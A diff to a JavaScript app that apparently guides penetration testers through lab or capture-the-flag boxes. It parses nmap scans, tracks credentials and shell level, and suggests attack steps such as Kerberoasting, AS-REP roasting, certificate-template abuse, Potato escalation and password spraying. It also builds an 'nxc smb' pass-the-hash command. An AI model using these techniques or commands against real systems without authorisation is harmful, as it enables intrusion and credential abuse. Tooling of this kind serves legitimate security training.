+function saveVars(){
+  const o={};VAR_KEYS.forEach(k=>{if(k!=="BOX")o[k]=VARS[k];});
+  store.setJson(varsKey(),o);rememberBox();
+}
+function loadVars(){
+  let o=store.json(varsKey(),null);
+  let migrated=false;
+  if(!o){
+    // Before v1.10.0 these lived only in the shared toolkit:vars blob, which was
+    // written for the other pages to read and never read back here. Adopt it
+    // once, for the box it actually belonged to, rather than blanking an
+    // upgrading user's IP and LHOST the first time they open this version.
+    const shared=store.json("toolkit:vars",{})||{};
+    if(shared&&shared.BOX===VARS.BOX){o=shared;migrated=true;}
+  }
+  VAR_KEYS.forEach(k=>{
+    if(k==="BOX")return;
+    VARS[k]=(o&&typeof o[k]==="string")?o[k]:"";
+    const el=document.getElementById("v_"+k);if(el)el.value=VARS[k];
+  });
+  if(migrated)saveVars();
+  publishVars();
+}
 function resolveVar(k){if(k==="HOST")return VARS.DOMAIN||VARS.IP||"";return VARS[k]||"";}
 function tokenText(k){const v=resolveVar(k);return v||k.toLowerCase();}
 function substitute(t){return t.replace(/\{([A-Z]+)\}/g,(_,k)=>{const v=resolveVar(k);return v?v:"<"+k.toLowerCase()+">";});}
@@ -1128,6 +1256,63 @@ function refreshTokens(){
     s.textContent=tokenText(k);
     s.classList.toggle("filled",!!v);s.classList.toggle("empty",!v);
   });
+}
+
+// ---------- derived context ----------
+// The scan, the credential table and the tick state each hold one piece of
+// "where am I on this box", and nothing joined them up: the planner worked out
+// "this is a domain controller" and then threw that away the moment it had
+// drawn one button. ctx is that join. It is recomputed whenever any of those
+// change, and the step gates, the track ranking, the tool row and the
+// next-move list all read it instead of each deriving their own answer.
+const ctx={
+  scanned:false,ports:[],portNums:[],svcs:new Set(),
+  isAD:false,isWindows:false,isLinux:false,hasWeb:false,hasSMB:false,hasDB:false,hasRemote:false,
+  creds:0,hashes:0,shell:"none",domain:"",versions:0
+};
+// Shell level is never guessed from prose. A phase carrying gives:"shell" or
+// gives:"root" moves it when any step inside it is ticked, and the two proof
+// flags do the same -- so it only ever reflects something you said you did.
+function shellFromProgress(){
+  let lvl="none";
+  const bump=g=>{if(g==="root")lvl="root";else if(g==="shell"&&lvl!=="root")lvl="user";};
+  if(progress["proof:s0"])bump("shell");
+  if(progress["proof:s1"])bump("root");
+  TRACKS.forEach(t=>t.phases.forEach(ph=>{
+    if(!ph.gives)return;
+    if(ph.steps.some((s,i)=>progress[t.id+":p"+ph.n+"s"+i]))bump(ph.gives);
+  }));
+  return lvl;
+}
+const HASH_RE=/^[a-f0-9]{32}(:[a-f0-9]{32})?$/i;
+function recomputeCtx(){
+  const ports=loadScan();
+  ctx.ports=ports;
+  ctx.scanned=ports.length>0;
+  ctx.portNums=ports.map(p=>+p.port);
+  ctx.svcs=new Set(ports.map(p=>svcKey(p.port,p.service)));
+  const has=n=>ctx.portNums.includes(n);
+  ctx.isAD=has(88)||has(389)||has(636)||ctx.svcs.has("kerberos");
+  ctx.isWindows=ctx.isAD||[135,139,445,3389,5985,5986].some(has)||ctx.svcs.has("winrm");
+  ctx.hasWeb=ctx.svcs.has("web");
+  ctx.hasSMB=ctx.svcs.has("smb");
+  ctx.hasDB=["mssql","mysql","postgres","oracle","mongo","redis","elastic"].some(k=>ctx.svcs.has(k));
+  ctx.hasRemote=ctx.svcs.has("ssh")||ctx.svcs.has("winrm")||ctx.svcs.has("rdp");
+  ctx.isLinux=ctx.scanned&&!ctx.isWindows;
+  ctx.versions=ports.filter(p=>p.version&&/\d/.test(p.version)).length;
+  const creds=((notesData&&notesData.creds)||[]).filter(c=>(c.u||"").trim()||(c.s||"").trim());
+  ctx.creds=creds.length;
+  ctx.hashes=creds.filter(c=>{const s=(c.s||"").trim();return HASH_RE.test(s)||/^\$krb5/i.test(s);}).length;
+  ctx.shell=shellFromProgress();
+  ctx.domain=VARS.DOMAIN||"";
+  return ctx;
+}
+// One call for "state moved, redraw the parts that key off it". Kept separate
+// from the view renderers so a tick does not have to rebuild the whole page.
+function refreshChrome(){
+  recomputeCtx();
+  renderPills();
+  syncVarFields();
 }
 
 // ---------- progress persistence ----------
@@ -1165,6 +1350,7 @@ function boxState(name){
     evidence:store.json("evidence2:"+name,{}),attempts:store.json("attempts:"+name,[]),
     scan:store.json("scan2:"+name,[]),scanText:store.get("scantext:"+name,""),
     findings:store.json("findings:"+name,[]),
+    vars:store.json("vars2:"+name,null),
     timer:store.get("timer2:"+name,"")};
 }
 function writeBoxState(name,st){
@@ -1175,10 +1361,12 @@ function writeBoxState(name,st){
   if(st.findings)store.setJson("findings:"+name,st.findings);
   if(st.scan)store.setJson("scan2:"+name,st.scan);
   if(st.scanText)store.set("scantext:"+name,st.scanText);
+  if(st.vars)store.setJson("vars2:"+name,st.vars);
   if(st.timer)store.set("timer2:"+name,st.timer);
 }
 function reloadBoxState(){
-  progress=loadProg();reloadNotes();reloadTimer();loadEvidence();loadAttempts();loadFindings();
+  progress=loadProg();loadVars();reloadNotes();reloadTimer();loadEvidence();loadAttempts();loadFindings();
+  _varsPref=null;refreshChrome();refreshTokens();
 }
 function switchBox(name){
   VARS.BOX=name||"";
@@ -1222,8 +1410,10 @@ function importBox(file){
     }
     writeBoxState(name,d.state);
     store.setJson("toolkit:boxes",[...new Set([...boxIndex(),name])]);
-    if(d.vars)VAR_KEYS.forEach(k=>{if(k!=="BOX"&&typeof d.vars[k]==="string"){VARS[k]=d.vars[k];
-      const el=document.getElementById("v_"+k);if(el)el.value=VARS[k];}});
+    if(d.vars){
+      const o={};VAR_KEYS.forEach(k=>{if(k!=="BOX"&&typeof d.vars[k]==="string")o[k]=d.vars[k];});
+      store.setJson("vars2:"+name,o);
+    }
     switchBox(name);
     toast("imported "+name);
   };
@@ -1232,7 +1422,7 @@ function importBox(file){
 }
 
 function updateBar(){
-  const boxes=Array.from(phasesEl.querySelectorAll(".step .cb input"));
+  const boxes=Array.from(phasesEl.querySelectorAll(".step:not(.locked) .cb input"));
   const done=boxes.filter(b=>b.checked).length;
   const pct=boxes.length?Math.round(done/boxes.length*100):0;
   document.getElementById("pbar").style.width=pct+"%";
@@ -1240,7 +1430,7 @@ function updateBar(){
   pl.textContent=(currentTrackName?currentTrackName+"  ":"")+done+" ticked / "+boxes.length;
   pl.title="Steps you have ticked. This is a record of the path you took, not a checklist to finish \u2014 take the route that works and leave the rest.";
   phasesEl.querySelectorAll(".phase").forEach(ph=>{
-    const bs=Array.from(ph.querySelectorAll(".step .cb input"));
+    const bs=Array.from(ph.querySelectorAll(".step:not(.locked) .cb input"));
     const pc=ph.querySelector(".pcount");if(pc)pc.textContent=bs.filter(b=>b.checked).length+"/"+bs.length;
   });
 }
@@ -1302,10 +1492,13 @@ function renderTrack(track){
   host.appendChild(toolbar(host,track.name));
   track.phases.forEach(ph=>{
     const det=document.createElement("details");det.className="phase";det.style.setProperty("--c",track.colour);
-    if(ph.n<=1)det.open=true;
+    if(ph.n<=1&&!(ph.when&&!ph.when(ctx)))det.open=true;
     const sum=document.createElement("summary");
+    const gated=!!(ph.when&&!ph.when(ctx));
     sum.innerHTML=`<span class="num">${ph.n}</span><span class="phead"><div class="ptitle">${ph.title}</div>`+
-      `<div class="pgoal">${ph.goal}</div></span><span class="pmeta"><span class="ptag">${ph.tag}</span>`+
+      `<div class="pgoal">${ph.goal}</div></span><span class="pmeta">`+
+      (gated?`<span class="lockbadge">needs ${escapeHtml(ph.needs||"more progress")}</span>`:"")+
+      `<span class="ptag">${ph.tag}</span>`+
       `<span class="pcount"></span><span class="chev">\u203A</span></span>`;
     det.appendChild(sum);
     const body=document.createElement("div");body.className="pbody";
@@ -1318,10 +1511,14 @@ function renderTrack(track){
       if(f.note){const nn=document.createElement("div");nn.className="xnote";nn.textContent=f.note;wrap.appendChild(nn);}
       body.appendChild(wrap);
     }
-    ph.steps.forEach((s,i)=>{
-      const step=document.createElement("div");step.className="step";step.dataset.id=track.id+":p"+ph.n+"s"+i;
+    // Steps are built one at a time so a gated one can be moved into a lock
+    // group without duplicating any of this.
+    const makeStep=(s,i,locked)=>{
+      const stepId=track.id+":p"+ph.n+"s"+i;
+      const step=document.createElement("div");step.className="step"+(locked?" locked":"");step.dataset.id=stepId;
       const cb=document.createElement("span");cb.className="cb";
-      const input=document.createElement("input");input.type="checkbox";input.id="cb-"+step.dataset.id.replace(/[^a-z0-9]/gi,"-");
+      const input=document.createElement("input");input.type="checkbox";input.id="cb-"+stepId.replace(/[^a-z0-9]/gi,"-");
+      if(locked){input.disabled=true;input.title="Locked until you have "+(s.needs||ph.needs||"made more progress");}
       cb.appendChild(input);
       const main=document.createElement("div");main.className="step-main";
       const desc=document.createElement("label");desc.className="step-desc";desc.htmlFor=input.id;desc.textContent=s.d;main.appendChild(desc);
@@ -1340,14 +1537,46 @@ function renderTrack(track){
         line.appendChild(cmd);line.appendChild(btn);main.appendChild(line);
       }
       if(s.l){const look=document.createElement("div");look.className="look";look.innerHTML=s.l;main.appendChild(look);}
-      main.appendChild(evidenceUI(step.dataset.id));
+      main.appendChild(evidenceUI(stepId));
       input.addEventListener("change",()=>{
         step.classList.toggle("done",input.checked);
-        progress[step.dataset.id]=input.checked;saveProg(progress);updateBar();
+        progress[stepId]=input.checked;saveProg(progress);updateBar();
+        // Ticking a step that lands a shell unlocks a chunk of the app, so the
+        // track has to be redrawn rather than just repainted.
+        if(ph.gives){const before=ctx.shell;refreshChrome();if(ctx.shell!==before){renderTrack(track);renderStuckLive();}}
       });
-      step.appendChild(cb);step.appendChild(main);body.appendChild(step);
+      step.appendChild(cb);step.appendChild(main);
+      return step;
+    };
+    // A phase gate applies to every step in it; a step gate to just that one.
+    // Ungated steps keep their order, gated ones collect under one line per
+    // distinct blocker, which is what stops a track reading as a wall.
+    const phaseLocked=!!(ph.when&&!ph.when(ctx));
+    const openSteps=[],locked=new Map();
+    ph.steps.forEach((s,i)=>{
+      const blocked=phaseLocked||(s.when&&!s.when(ctx));
+      if(!blocked){openSteps.push([s,i]);return;}
+      const need=(phaseLocked?(ph.needs||""):(s.needs||""))||"made more progress";
+      if(!locked.has(need))locked.set(need,[]);
+      locked.get(need).push([s,i]);
     });
-    if(ph.branch)ph.branch.forEach(b=>{const br=document.createElement("div");br.className="branch";br.textContent=b;body.appendChild(br);});
+    if(phaseLocked){
+      det.classList.add("locked");det.open=false;
+      const g=document.createElement("div");g.className="gate";
+      g.innerHTML="<b>locked</b> — these steps unlock once you have "+escapeHtml(ph.needs||"made more progress")+".";
+      body.appendChild(g);
+      ph.steps.forEach((s,i)=>body.appendChild(makeStep(s,i,true)));
+    }else{
+      openSteps.forEach(([s,i])=>body.appendChild(makeStep(s,i,false)));
+      locked.forEach((items,need)=>{
+        const g=document.createElement("details");g.className="lockgroup";
+        const sm=document.createElement("summary");
+        sm.textContent=items.length+(items.length===1?" step unlocks":" steps unlock")+" once you have "+need;
+        g.appendChild(sm);
+        items.forEach(([s,i])=>g.appendChild(makeStep(s,i,true)));
+        body.appendChild(g);
+      });
+    }
     if(ph.tips){const tips=document.createElement("div");tips.className="tips";
       tips.innerHTML=`<h4>advice</h4><ul>${ph.tips.map(t=>`<li>${t}</li>`).join("")}</ul>`;body.appendChild(tips);}
     det.appendChild(body);host.appendChild(det);
@@ -1588,6 +1817,12 @@ function saveScanText(t){store.set(scanTextKey(),t);rememberBox();}
 function loadScanText(){return store.get(scanTextKey(),"")||"";}
 function renderPlanner(){
   openOverlay("Scan planner","__planner","#5aa2ff");
+  plannerUI(host,true);
+}
+// The same intake, rendered either into the tool overlay or inline as the
+// first thing on a box that has no scan yet. One implementation, so the
+// front door and the tool can never drift apart.
+function plannerUI(target,focusIt){
   const wrap=document.createElement("div");wrap.className="planner";
   wrap.innerHTML='<textarea id="scanInput" aria-label="Scan output" placeholder="paste nmap output here — normal output (-oN / -sCV) works best, greppable (-oG) also fine"></textarea>'+
     '<div class="drop" id="scanDrop"><span>or load a scan file — drop it anywhere here, or</span>'+
@@ -1596,7 +1831,7 @@ function renderPlanner(){
     '<span class="planner-hint">enum.sh writes one at <code>enum_&lt;ip&gt;/nmap/detailed.nmap</code></span></div>'+
     '<div class="planner-actions"><button id="genBtn" class="genbtn" type="button">generate commands</button>'+
     '<span class="planner-hint" id="scanHint"></span></div><div id="planOut"></div>';
-  host.appendChild(wrap);
+  target.appendChild(wrap);
   const ta=document.getElementById("scanInput"),out=document.getElementById("planOut");
   ta.value=loadScanText();
   const run=()=>generatePlan(ta.value,out);
@@ -1626,26 +1861,32 @@ function renderPlanner(){
   });
 
   if(ta.value.trim())run();
-  ta.focus();
+  if(focusIt)ta.focus();
 }
 
+let _scanSetDomain="";
 function generatePlan(text,out){
   out.innerHTML="";
   const hint=document.getElementById("scanHint");
   if(!text.trim()){hint.textContent="";return;}
   const r=parseScan(text);
   if(r.ip){document.getElementById("v_IP").value=r.ip;VARS.IP=r.ip;}
-  if(r.host&&r.host!==r.ip){const el=document.getElementById("v_DOMAIN");if(!el.value){el.value=r.host;VARS.DOMAIN=r.host;}}
-  refreshTokens();
+  // Adopt the scanned hostname when the field is empty, or still holds the one
+  // an earlier scan put there -- scanning a second box used to leave the first
+  // box's domain in place, and the board now prints it in a headline. A value
+  // you typed yourself is never overwritten.
+  if(r.host&&r.host!==r.ip){
+    const el=document.getElementById("v_DOMAIN");
+    if(!el.value||el.value===_scanSetDomain){el.value=r.host;VARS.DOMAIN=r.host;_scanSetDomain=r.host;}
+  }
+  saveVars();publishVars();refreshTokens();
   hint.textContent=r.ports.length?(r.ports.length+" open ports parsed"+(r.ip?" on "+r.ip:"")):"no open ports found in that text";
   if(!r.ports.length)return;
 
-  const nums=r.ports.map(p=>+p.port),has=n=>nums.includes(n);
-  let boxType,trackId;
-  if(has(88)||has(389)||has(636)){boxType="Active Directory / Domain Controller";trackId="ad";}
-  else if([135,139,445,3389,5985,5986].some(has)){boxType="Windows host";trackId="windows";}
-  else if(r.ports.some(p=>svcKey(p.port,p.service)==="web")){boxType="Web-facing host";trackId="web";}
-  else{boxType="Likely Linux host";trackId="linux";}
+  // Persist first: the classifier below, the pills and the next-move list all
+  // read the derived context, and saveScan is what recomputes it.
+  saveScan(r.ports);
+  const [boxType,,trackId]=boxTypeOf();
 
   const banner=document.createElement("div");banner.className="plan-banner";
   banner.innerHTML="<div><b>"+boxType+"</b>"+(r.host?" &middot; "+escapeHtml(r.host):"")+"</div>";
@@ -1696,7 +1937,6 @@ function generatePlan(text,out){
     det.appendChild(body);out.appendChild(det);
   });
   out.appendChild(toolbar(out,"plan"));
-  saveScan(r.ports);
   refreshTokens();
 }
 
@@ -1980,7 +2220,7 @@ function renderDrawer(){
     [["u","user"],["s","pass / hash"],["w","service"]].forEach(([f,ph])=>{
       const td=document.createElement("td");const inp=document.createElement("input");
       inp.value=row[f]||"";inp.placeholder=ph;inp.setAttribute("aria-label",ph);
-      inp.addEventListener("input",()=>{notesData.creds[i][f]=inp.value;saveNotes(notesData);});
+      inp.addEventListener("input",()=>{notesData.creds[i][f]=inp.value;saveNotes(notesData);autoAdoptCred();refreshChrome();});
       td.appendChild(inp);tr.appendChild(td);
     });
     const td=document.createElement("td");
@@ -1990,14 +2230,18 @@ function renderDrawer(){
     use.onclick=()=>{const r=notesData.creds[i];const isHash=/^[a-f0-9]{32}(:[a-f0-9]{32})?$/i.test((r.s||"").trim());
       const cmd="nxc smb "+(VARS.IP||"<ip>")+" -u '"+(r.u||"user")+"' "+(isHash?"-H '"+r.s+"'":"-p '"+(r.s||"pass")+"'");
       navigator.clipboard.writeText(cmd).then(()=>flash(use)).catch(()=>flash(use));};
+    const setb=document.createElement("button");setb.className="mini";setb.type="button";setb.textContent="set";
+    setb.title="Use this credential as {USER} / {PASS} in every command on the page";
+    setb.setAttribute("aria-label","Use "+(row.u||"this credential")+" as the current USER and PASS");
+    setb.onclick=()=>{adoptCred(notesData.creds[i]);flash(setb,"set");};
     const del=document.createElement("button");del.className="mini";del.type="button";del.textContent="\u00d7";
     del.title="Delete this credential";del.setAttribute("aria-label","Delete credential for "+(row.u||"this row"));
     del.onclick=()=>{
       const label=row.u||row.s||"this row";
       if((row.u||row.s)&&!confirm("Delete the credential for '"+label+"'?"))return;
-      notesData.creds.splice(i,1);saveNotes(notesData);renderDrawer();
+      notesData.creds.splice(i,1);saveNotes(notesData);renderDrawer();refreshChrome();
     };
-    td.appendChild(use);td.appendChild(del);tr.appendChild(td);tbody.appendChild(tr);
+    td.appendChild(use);td.appendChild(setb);td.appendChild(del);tr.appendChild(td);tbody.appendChild(tr);
   });
   const na=document.getElementById("notesArea");if(na)na.value=notesData.text||"";
 }
@@ -2031,7 +2275,7 @@ function saveTimer(){
 
 // --- markdown report ---
 function scanKey(){return "scan2:"+(VARS.BOX||"_default");}
-function saveScan(ports){store.setJson(scanKey(),ports||[]);rememberBox();}
+function saveScan(ports){store.setJson(scanKey(),ports||[]);rememberBox();refreshChrome();}
 function loadScan(){const v=store.json(scanKey(),[]);return Array.isArray(v)?v:[];}
 function buildReport(){
   const p=loadScan();
@@ -2654,58 +2898,187 @@ function renderWriteup(){
 }
 
 // ---------- overview ----------
+// ---------- what kind of box is this ----------
+// One classifier, read by the planner banner, the overview board and nothing
+// else. It reports the reason as well as the verdict, because an unexplained
+// "Active Directory" is a guess you cannot check.
+function boxTypeOf(){
+  if(!ctx.scanned)return ["Unknown box","no scan parsed yet","recon"];
+  let type,why;
+  if(ctx.isAD){type="Active Directory / Domain Controller";why="88, 389 or 636 answered — this is a DC";}
+  else if(ctx.isWindows){type="Windows host";why="Windows service ports, no domain services";}
+  else{type="Likely Linux host";why="no Windows service ports in the scan";}
+  if(ctx.hasWeb)why+=", web is the biggest surface";
+  rankTracks();
+  const top=_rankedTracks.find(t=>t.id!=="recon"&&trackScore(t)[0]>0);
+  return [type,why,top?top.id:"recon"];
+}
+
+// ---------- next moves ----------
+// The board's whole job. Given the ports, the credentials and how far in you
+// are, these are the few things worth doing now -- each one jumps to the exact
+// phase that does it, so the suggestion and the commands are never separate.
+function nextMoves(){
+  const c=ctx,out=[];
+  const go=(id,phase,step)=>()=>{
+    const t=TRACKS.find(x=>x.id===id);if(!t)return;
+    renderTrack(t);
+    if(phase!=null)focusStep(id+":p"+phase+"s"+(step||0),true);
+  };
+  const add=(mt,mw,mg,run,colour)=>out.push({mt,mw,mg,run,colour:colour||"#5aa2ff"});
+
+  if(!c.scanned){
+    add("Paste your nmap output","Everything else on this page keys off it: the box type, the track order, the commands per port.",
+      "scan planner",()=>renderPlanner());
+    return out;
+  }
+  if(c.isAD&&!c.creds){
+    add("Get a first credential","88 and 389 are open and you hold nothing yet. RID-brute a null session, read the user descriptions, AS-REP roast.",
+      "Active Directory · 1",go("ad",1),COL.ad);
+  }
+  if(c.isAD&&c.creds){
+    add("Collect BloodHound data","You have a credential. Do this before anything clever — it draws the shortest path to Domain Admin for you.",
+      "Active Directory · 2",go("ad",2,1),COL.ad);
+    add("Kerberoast the service accounts","Service accounts carry weak passwords far more often than user accounts do, and the hash cracks offline.",
+      "Active Directory · 2",go("ad",2,4),COL.ad);
+    add("Check the certificate templates","certipy names the exact ESC. A vulnerable template is a straight line from any domain user to Domain Admin.",
+      "AD certs · 1",go("adcs",1),COL.adcs);
+  }
+  if(c.hasSMB&&!c.creds){
+    add("Try a null and guest session on SMB","445 is open. A readable share is the most-missed way in on the whole list.",
+      "Recon · 2",go("recon",2,0),COL.recon);
+  }
+  if(c.hasWeb&&c.shell==="none"){
+    add("Map the web app","Fingerprint the stack, read the source, then brute the directories — in that order.",
+      "Web app · 1",go("web",1),COL.web);
+  }
+  if(c.versions&&c.shell==="none"){
+    add("searchsploit every version string",c.versions+" service"+(c.versions===1?"":"s")+" reported a version. Most boxes fall to a known CVE in one of them, not to anything cleverer.",
+      "exploit suggester",()=>renderExploits(),"#f43f5e");
+  }
+  if(c.shell==="user"){
+    const win=c.isWindows;
+    add("Enumerate for privilege escalation",win?"whoami /priv first — SeImpersonate is a Potato away from SYSTEM. Then winpeas, and actually read it.":"sudo -l first, it is the fastest win. Then linpeas, and actually read it.",
+      (win?"Windows":"Linux")+" · 2",go(win?"windows":"linux",2),win?COL.windows:COL.linux);
+    if(!win)add("Cross-reference the SUID list","Paste the output of the find command and every binary gets checked against GTFOBins in one pass.",
+      "SUID xref",()=>renderSuidXref(),"#c084fc");
+  }
+  if(c.shell==="root"){
+    add("Grab proof with context","Flag, whoami and the box address in a single frame. Do it before you break something.",
+      "proof checklist",()=>renderProof(),"#fbbf24");
+    add("Build the write-up","Everything you ticked, with its evidence, assembled into a report you can hand over.",
+      "write-up",()=>renderWriteup());
+  }
+  if(c.creds&&c.shell!=="root"){
+    add("Spray what you already have","Reuse escalates more boxes than exploits do. SSH, SMB, WinRM, the database, the web login.",
+      "Password attacks · 3",go("pw",3),COL.pw);
+  }
+  if(c.shell!=="none"){
+    add("Look for a second network","Once you own a host, check for another NIC and internal hosts behind it.",
+      "Pivoting · 1",go("pivot",1),COL.pivot);
+  }
+  return out;
+}
+
 function renderOverview(){
   closeOverlay(false);currentTrackName="";
   setView("overview");
+  refreshChrome();
   document.querySelectorAll(".track-pill").forEach(p=>p.classList.toggle("active",p.dataset.id==="__overview"));
   document.documentElement.style.setProperty("--c","#5aa2ff");
   document.getElementById("thName").textContent="Overview";
-  document.getElementById("thBlurb").textContent="Where you are on this box. Pick a track to work, or a tool from the row above.";
+  document.getElementById("thBlurb").textContent=ctx.scanned
+    ?"What the scan says this box is, and the few things worth doing next."
+    :"Start with a scan. Everything else on the page is built from it.";
   host.style.setProperty("--c","#5aa2ff");host.innerHTML="";
 
-  const ports=loadScan();
+  const ports=ctx.ports;
+  const [type,why,trackId]=boxTypeOf();
 
-  // First run is otherwise a wall of em-dashes with nothing to act on.
-  if(!ports.length&&!VARS.IP&&!Object.keys(progress).length){
-    const cta=document.createElement("div");cta.className="empty-cta";
+  // ---- state one: nothing parsed yet. The scan IS the front door. ----
+  if(!ctx.scanned){
+    const cta=document.createElement("div");cta.className="intake empty-cta";
     const h=document.createElement("h3");h.textContent="Start with a scan";
-    const p=document.createElement("p");
-    p.textContent="Paste or drop your nmap output into the scan planner. It works out what the box is, lists the right commands for every open port, fills in your IP, and points you at the track to work. Everything after that \u2014 tracks, exploit suggestions, the write-up \u2014 builds on it.";
-    const b=document.createElement("button");b.className="genbtn";b.type="button";b.textContent="open the scan planner";
-    b.onclick=()=>renderPlanner();
-    const b2=document.createElement("button");b2.className="genbtn ghost";b2.type="button";b2.textContent="or browse a track";
-    b2.style.marginLeft="8px";b2.onclick=()=>renderTrack(TRACKS[0]);
-    cta.appendChild(h);cta.appendChild(p);cta.appendChild(b);cta.appendChild(b2);
+    const lede=document.createElement("p");lede.className="lede";
+    lede.textContent="Paste or drop your nmap output. It works out what the box is, lists the right commands for every open port, fills in your IP, orders the tracks by what the ports imply, and unlocks the steps you can actually run. Everything after this builds on it.";
+    cta.appendChild(h);cta.appendChild(lede);
     host.appendChild(cta);
-  }
+    plannerUI(cta,false);
+    const alt=document.createElement("div");alt.className="ov-sec";
+    alt.textContent="or work without one";
+    host.appendChild(alt);
+    const b2=document.createElement("button");b2.className="genbtn ghost";b2.type="button";
+    b2.textContent="browse the recon track";
+    b2.onclick=()=>renderTrack(TRACKS[0]);
+    host.appendChild(b2);
+  }else{
+    // ---- state two: the board. What it is, then what to do about it. ----
+    const bt=document.createElement("div");bt.className="boxtype";
+    const t=TRACKS.find(x=>x.id===trackId);
+    if(t)bt.style.setProperty("--c",t.colour);
+    const left=document.createElement("div");
+    const bn=document.createElement("div");bn.className="bt";bn.textContent=type;
+    const bw=document.createElement("div");bw.className="bw";
+    bw.textContent=why+(ctx.domain?" · "+ctx.domain:"")+" · "+ports.length+" open port"+(ports.length===1?"":"s")+
+      " · "+(ctx.shell==="none"?"no shell yet":ctx.shell==="root"?"root / SYSTEM":"user shell")+
+      (ctx.creds?" · "+ctx.creds+" credential"+(ctx.creds===1?"":"s"):"");
+    left.appendChild(bn);left.appendChild(bw);bt.appendChild(left);
+    if(t){
+      const jb=document.createElement("button");jb.className="genbtn small";jb.type="button";
+      jb.textContent="work the "+t.name+" track";
+      jb.onclick=()=>renderTrack(t);
+      bt.appendChild(jb);
+    }
+    host.appendChild(bt);
 
-  const stats=document.createElement("div");stats.className="ov-stats";
-  const stat=(k,v)=>{const d=document.createElement("div");d.className="ov-stat";d.innerHTML='<div class="k">'+k+'</div><div class="v">'+escapeHtml(v)+'</div>';return d;};
-  stats.appendChild(stat("box",VARS.BOX||"\u2014"));
-  stats.appendChild(stat("ip",VARS.IP||"\u2014"));
-  if(VARS.DOMAIN)stats.appendChild(stat("domain",VARS.DOMAIN));
-  stats.appendChild(stat("time on box",timerStart?(fmtDur(timerElapsed())+(timerPaused?" (paused)":"")):"not started"));
-  stats.appendChild(stat("creds logged",String(notesData.creds.filter(c=>c.u||c.s).length)));
-  stats.appendChild(stat("open ports",String(ports.length||0)));
-  let tick=0,ev=0;
-  Object.keys(progress).forEach(id=>{if(progress[id]){tick++;if(evHas(id))ev++;}});
-  stats.appendChild(stat("evidence",tick?ev+" / "+tick+" ticked":"\u2014"));
-  const ruled=attempts.filter(a=>a.what&&a.result==="ruled out").length;
-  if(attempts.length)stats.appendChild(stat("ruled out",String(ruled)));
-  if(findings.length)stats.appendChild(stat("findings",String(findings.length)));
-  host.appendChild(stats);
+    const moves=nextMoves();
+    if(moves.length){
+      const s0=document.createElement("div");s0.className="ov-sec";s0.textContent="next moves";host.appendChild(s0);
+      const wrap=document.createElement("div");wrap.className="moves";
+      moves.slice(0,5).forEach(m=>{
+        const b=document.createElement("button");b.className="move";b.type="button";
+        b.style.setProperty("--mc",m.colour);
+        const mt=document.createElement("span");mt.className="mt";mt.textContent=m.mt;
+        const mw=document.createElement("span");mw.className="mw";mw.textContent=m.mw;
+        const mg=document.createElement("span");mg.className="mg";mg.textContent=m.mg;
+        b.appendChild(mt);b.appendChild(mw);b.appendChild(mg);
+        b.addEventListener("click",m.run);
+        wrap.appendChild(b);
+      });
+      host.appendChild(wrap);
+    }
 
-  if(ports.length){
     const s=document.createElement("div");s.className="ov-sec";s.textContent="open ports (from your last scan)";host.appendChild(s);
     const pr=document.createElement("div");pr.className="ov-ports";
     ports.forEach(p=>{const b=document.createElement("div");b.className="ov-port";b.textContent=p.port+"/"+p.proto+(p.service?" "+p.service:"");pr.appendChild(b);});
     host.appendChild(pr);
   }
 
-  const s2=document.createElement("div");s2.className="ov-sec";s2.textContent="progress by track";host.appendChild(s2);
+  // ---- shared tail: the numbers, then per-track progress ----
+  const s1=document.createElement("div");s1.className="ov-sec";s1.textContent="this box";host.appendChild(s1);
+  const stats=document.createElement("div");stats.className="ov-stats";
+  const stat=(k,v)=>{const d=document.createElement("div");d.className="ov-stat";d.innerHTML='<div class="k">'+k+'</div><div class="v">'+escapeHtml(v)+'</div>';return d;};
+  stats.appendChild(stat("box",VARS.BOX||"—"));
+  stats.appendChild(stat("ip",VARS.IP||"—"));
+  if(VARS.DOMAIN)stats.appendChild(stat("domain",VARS.DOMAIN));
+  stats.appendChild(stat("time on box",timerStart?(fmtDur(timerElapsed())+(timerPaused?" (paused)":"")):"not started"));
+  stats.appendChild(stat("creds logged",String(ctx.creds)));
+  stats.appendChild(stat("open ports",String(ports.length||0)));
+  let tick=0,ev=0;
+  Object.keys(progress).forEach(id=>{if(progress[id]){tick++;if(evHas(id))ev++;}});
+  stats.appendChild(stat("evidence",tick?ev+" / "+tick+" ticked":"—"));
+  const ruled=attempts.filter(a=>a.what&&a.result==="ruled out").length;
+  if(attempts.length)stats.appendChild(stat("ruled out",String(ruled)));
+  if(findings.length)stats.appendChild(stat("findings",String(findings.length)));
+  host.appendChild(stats);
+
+  const s2=document.createElement("div");s2.className="ov-sec";
+  s2.textContent=ctx.scanned?"progress by track (ordered by what the scan implies)":"progress by track";
+  host.appendChild(s2);
   const list=document.createElement("div");list.className="ov-tracks";
   let gTot=0,gDone=0;
-  TRACKS.forEach(t=>{
+  // Same order as the pills, so the two never contradict each other.
+  _rankedTracks.forEach(t=>{
     let tot=0,dn=0;
     t.phases.forEach(ph=>ph.steps.forEach((s,i)=>{tot++;if(progress[t.id+":p"+ph.n+"s"+i])dn++;}));
     gTot+=tot;gDone+=dn;
@@ -3203,13 +3576,20 @@ function renderSuidXref(){
   ta.focus();
 }
 
+// `when` decides whether a tool is offered up front or folded under "more".
+// Nothing is ever removed: the palette and the more-row still reach all eight,
+// so a wrong guess about what you need costs one click, not a dead end.
 const TOOLS=[
   {id:"planner", pill:"__planner", label:"Paste scan", colour:"#5aa2ff", fn:()=>renderPlanner()},
   {id:"shells",  pill:"__shells",  label:"Shells",    colour:"#34d399", fn:()=>renderShells()},
-  {id:"hashes",  pill:"__hashes",  label:"Hashes",    colour:"#a3e635", fn:()=>renderHashes()},
-  {id:"proof",   pill:"__proof",   label:"Proof",     colour:"#fbbf24", fn:()=>renderProof()},
-  {id:"exploits",pill:"__exploits",label:"Exploits",  colour:"#f43f5e", fn:()=>renderExploits()},
-  {id:"suid",    pill:"__suid",    label:"SUID xref", colour:"#c084fc", fn:()=>renderSuidXref()},
+  {id:"hashes",  pill:"__hashes",  label:"Hashes",    colour:"#a3e635", fn:()=>renderHashes(),
+   when:c=>c.hashes>0||c.creds>0},
+  {id:"proof",   pill:"__proof",   label:"Proof",     colour:"#fbbf24", fn:()=>renderProof(),
+   when:c=>c.shell!=="none"},
+  {id:"exploits",pill:"__exploits",label:"Exploits",  colour:"#f43f5e", fn:()=>renderExploits(),
+   when:c=>c.versions>0},
+  {id:"suid",    pill:"__suid",    label:"SUID xref", colour:"#c084fc", fn:()=>renderSuidXref(),
+   when:c=>c.shell!=="none"},
